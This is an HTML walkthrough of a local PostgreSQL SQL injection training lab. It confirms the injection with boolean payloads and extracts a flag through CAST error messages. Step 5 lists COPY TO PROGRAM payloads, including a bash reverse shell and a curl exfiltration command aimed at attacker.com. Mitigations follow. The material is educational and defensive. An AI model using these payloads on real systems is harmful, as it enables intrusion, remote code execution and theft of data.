<h4>Step 1: Identify the Search Functionality</h4>
<p>
    Start by testing the document search with a normal query to understand how it works.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Baseline Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Input: </span>report<br>
        <span class="prompt">SQL&gt; </span>SELECT id, filename, content FROM documents WHERE filename ILIKE '%report%'<br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=report"<br><br>
        <span class="prompt">Output:</span><br>
        <strong>ID:</strong> 1 &bull; <strong>Filename:</strong> report_q1.pdf &bull; <strong>Content:</strong> Quarterly financial report for Q1 2026.
    </div>
</div>

<h4>Step 2: Confirm SQL Injection</h4>
<p>
    Test for injection by breaking the string with a single quote.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Injection Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=' AND 1=1 -- -"<br>
        <span class="prompt">Response: </span>All 4 documents returned (TRUE condition -- wildcard match)<br>
        &nbsp;&nbsp;[report_q1.pdf, employee_list.csv, server_config.txt, backup_log.txt]<br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=' AND 1=2 -- -"<br>
        <span class="prompt">Response: </span>No documents found matching your search. (FALSE condition)
    </div>
</div>

<h4>Step 3: Error-Based Extraction with CAST</h4>
<p>
    PostgreSQL's CAST function throws a detailed error when trying to convert a string
    to an integer. The error message includes the actual string value: perfect for
    extracting data from hidden tables.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CAST Error Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab9" \<br> --data-urlencode "search=' AND 1=CAST((SELECT secret_value FROM admin_secrets LIMIT 1) AS INTEGER) -- -"<br><br>
        <span class="prompt">Response: </span><strong>Query Error:</strong> ERROR:  invalid input syntax for type integer: "FLAG{pg_c0py_t0_pr0gr4m_rc3}"
    </div>
</div>

<h4>Step 4: Submit the Flag</h4>
<p>
    Copy the flag from the error message and paste it into the verification form:
    <code>FLAG{pg_c0py_t0_pr0gr4m_rc3}</code>.
</p>

<h4>Step 5: Understanding COPY TO PROGRAM (Advanced RCE Concept)</h4>
<p>
    While the lab uses CAST error extraction for practical solvability, the real-world
    danger of this vulnerability class is <strong>Remote Code Execution</strong> via
    PostgreSQL's <code>COPY ... TO PROGRAM</code> command. This requires
    <strong>superuser</strong> privileges on the database.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. COPY TO PROGRAM (Conceptual)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Execute OS command -- requires superuser</span><br>
        <span class="prompt">Payload: </span>'; COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned.txt'; -- -<br>
        <span class="prompt">Effect: </span>Executes 'id' command, writes output to /tmp/pwned.txt<br><br>
        <span class="prompt">// Reverse shell example</span><br>
        <span class="prompt">Payload: </span>'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"'; -- -<br>
        <span class="prompt">Effect: </span>Opens a reverse shell to attacker's listener<br><br>
        <span class="prompt">// Exfiltrate data to file</span><br>
        <span class="prompt">Payload: </span>'; COPY (SELECT secret_value FROM admin_secrets) TO PROGRAM 'curl -d @- http://attacker.com/exfil'; -- -<br>
        <span class="prompt">Effect: </span>Sends table contents to attacker's HTTP server
    </div>
</div>

<h4>Step 6: COPY TO PROGRAM. How It Works</h4>
<p>
    The <code>COPY</code> command in PostgreSQL is normally used for bulk data import/export.
    The <code>TO PROGRAM</code> variant pipes query results to an OS command:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. COPY TO PROGRAM Syntax</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Basic syntax</span><br>
        COPY (SELECT query) TO PROGRAM 'shell_command';<br><br>
        <span class="prompt">// COPY FROM PROGRAM -- read command output into table</span><br>
        COPY table_name FROM PROGRAM 'shell_command';<br><br>
        <span class="prompt">// Requirements:</span><br>
        - PostgreSQL superuser privilege<br>
        - The command runs as the 'postgres' OS user<br>
        - Available since PostgreSQL 9.3+
    </div>
</div>

<h4>Step 7: Detection and Prevention</h4>
<p>
    How to detect and prevent COPY TO PROGRAM abuse:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Mitigations</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">1. </span>Never use superuser accounts for application connections<br>
        <span class="prompt">2. </span>Use parameterized queries / prepared statements<br>
        <span class="prompt">3. </span>Restrict COPY TO PROGRAM via pg_hba.conf and role permissions<br>
        <span class="prompt">4. </span>Monitor for COPY ... PROGRAM in query logs<br>
        <span class="prompt">5. </span>Use SELinux or AppArmor to restrict postgres process capabilities
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> PostgreSQL's <code>COPY ... TO PROGRAM</code> is one of the
    most dangerous post-exploitation techniques in SQL injection. It allows direct OS command
    execution when the database user has superuser privileges. Even without superuser, CAST
    error-based extraction can reveal sensitive data. Defense: never grant superuser to
    application accounts, always use prepared statements, and monitor for suspicious COPY
    commands in PostgreSQL logs.
</div>
